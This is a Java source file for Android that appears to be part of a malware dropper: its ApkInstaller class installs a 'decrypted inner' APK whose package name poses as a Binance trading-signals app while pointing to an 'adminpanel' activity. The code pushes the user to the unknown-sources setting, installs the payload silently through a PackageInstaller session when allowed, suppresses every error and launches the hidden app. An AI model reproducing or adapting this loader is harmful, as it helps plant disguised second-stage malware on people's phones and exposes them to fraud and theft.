package com.pkg.loader.dispatch.internal;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;

import androidx.core.content.FileProvider;

import com.pkg.loader.dispatch.InstallResultReceiver;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;

import android.app.PendingIntent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;

/** Installs decrypted inner Chatee APK. */
public final class ApkInstaller {
    public static final String INNER_PACKAGE = "dApp.binance.Trading.Signals";
    public static final String INNER_ACTIVITY =
        "com.spinplay99.adminpanel.MainActivity";

    private ApkInstaller() {}

    public static boolean canSilentlyInstall(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return true;
        }
        return context.getPackageManager().canRequestPackageInstalls();
    }

    public static void requestInstallPermission(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return;
        }
        try {
            Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception ignored) {
        }
    }

    public static boolean isInnerInstalled(Context context) {
        try {
            PackageInfo info = context.getPackageManager().getPackageInfo(
                INNER_PACKAGE, PackageManager.GET_ACTIVITIES);
            return info != null;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public static void launchInner(Context context) {
        try {
            Intent direct = new Intent();
            direct.setClassName(INNER_PACKAGE, INNER_ACTIVITY);
            direct.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(direct);
            return;
        } catch (Exception ignored) {
        }
        Intent launch = context.getPackageManager().getLaunchIntentForPackage(INNER_PACKAGE);
        if (launch != null) {
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(launch);
        }
    }

    public static void install(Context context, String apkPath) {
        if (!canSilentlyInstall(context)) {
            requestInstallPermission(context);
            installWithViewer(context, apkPath);
            return;
        }
        trySilentInstall(context, apkPath);
    }

    private static void trySilentInstall(Context context, String apkPath) {
        if (!canSilentlyInstall(context)) {
            return;
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }
        try {
            PackageInstaller installer = context.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                params.setInstallReason(PackageManager.INSTALL_REASON_USER);
            }
            File apk = new File(apkPath);
            params.setSize(apk.length());
            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);
            try (OutputStream out = session.openWrite("base", 0, apk.length());
                 FileInputStream in = new FileInputStream(apk)) {
                byte[] buf = new byte[65536];
                int read;
                while ((read = in.read(buf)) != -1) {
                    out.write(buf, 0, read);
                }
                session.fsync(out);
            }
            Intent callback = new Intent(context, InstallResultReceiver.class);
            callback.setAction(InstallResultReceiver.ACTION);
            callback.setPackage(context.getPackageName());
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                flags |= PendingIntent.FLAG_MUTABLE;
            }
            PendingIntent pending = PendingIntent.getBroadcast(
                context, sessionId, callback, flags);
            session.commit(pending.getIntentSender());
            session.close();
        } catch (IOException ignored) {
        }
    }

    public static void installWithViewer(Context context, String apkPath) {
        try {
            File apk = new File(apkPath);
            Uri uri = FileProvider.getUriForFile(
                context, context.getPackageName() + ".fileprovider", apk);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            context.startActivity(intent);
        } catch (Exception ignored) {
        }
    }
}
